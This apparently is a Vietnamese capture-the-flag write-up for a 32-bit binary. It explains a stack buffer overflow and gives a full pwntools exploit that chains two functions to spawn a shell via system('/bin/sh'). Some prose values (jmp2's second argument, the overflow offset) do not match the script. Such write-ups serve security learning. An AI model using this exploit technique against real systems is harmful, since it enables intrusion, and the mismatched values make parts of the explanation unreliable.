
Giờ ta sẽ nhìn qua file binary được cung cấp và các chế độ bảo vệ:

![image](https://user-images.githubusercontent.com/114044703/213363744-10546499-32db-48f7-9635-299f92477644.png)

![image](https://user-images.githubusercontent.com/114044703/213363861-54135429-a1da-498f-a19e-525346190c8f.png)

Vậy chúng ta sẽ làm việc với file binary 32 bit. Khi chạy thì chương trình sẽ yêu cầu ta nhập tên và hỏi ta có giấc mơ nào không, nếu có thì ta sẽ được ghi vào

![image](https://user-images.githubusercontent.com/114044703/213364568-5008bf8d-4aa0-4dfe-8762-8a650f8be030.png)

![image](https://user-images.githubusercontent.com/114044703/213364621-65fe7a0c-4fc0-482a-8210-9858b86d8c50.png)

Có vẻ như chương trình bị lỗi buffer over flow. Biến dream được nhập vào 140 ký tự mà mảng dream chỉ có 80 phần tử, thêm vào đó offset giữa dream và save rip là 0x80(128)-> có thể đè save rip  

Khi tìm thêm ta thấy 2 hàm jump:

![image](https://user-images.githubusercontent.com/114044703/213365113-328c3e7f-95ca-4041-9daa-f58945a1e002.png)

![image](https://user-images.githubusercontent.com/114044703/213365133-e75ff069-e48b-4e13-8da0-2c2bc1c1913c.png)

Hàm jmp2 sẽ thực thi lệnh system nếu arg1=0xcafebabe, arg2=0x13371337 và jmp1=1. Mà hàm jmp1 lại khiến cho jmp1 =1 khi agr1 của nó bằng 0xdeadbeef.

Ý tưởng: Ta sẽ gọi hàm jmp1 với arg1 là 0xdeadbeef sau đó quay lại thực thi main và lại sử dụng lỗi bof phía trên để nhảy sang jpm2 với những arg thích hợp để thực thi system("/bin/sh")(vì khi từ jmp1 call sang jmp2 chỉ cho đc 1 arg của jmp2)

 
Ta sẽ khai thác với những dữ kiện trên:

```
from pwn import *
debug=1

jmp1=0x080492b4
main_1=0x08049378
jmp1_arg=0xdeadbeef

jmp2=0x080492e0
jmp2_arg1=0xcafebabe
jmp2_arg2=0x48385879

if debug:
	t=process("./shortjumps")
	#gdb.attach(t,api=True)	
else:
	t=remote("146.190.115.228",9993)
	
t.sendlineafter(b"> ",b"KSCS")
t.sendlineafter(b"> ",b"Y")
payload=b"A"*124+p32(jmp1)+p32(main_1)+p32(jmp1_arg) #main->jump1-> main

t.sendlineafter(b"> ",payload)
t.sendlineafter(b"> ",b"KCSC")
t.sendlineafter(b"> ",b"Y")
payload=b"A"*124+p32(0x080492e0)+p32(main_1)+p32(jmp2_arg1)+p32(jmp2_arg2) #jump2
t.sendlineafter(b"> ",payload)
t.interactive()
```

Sau khi thực thi:

![image](https://user-images.githubusercontent.com/114044703/213366761-5abbe76f-f792-4d03-b895-8b9eac687d34.png)

 

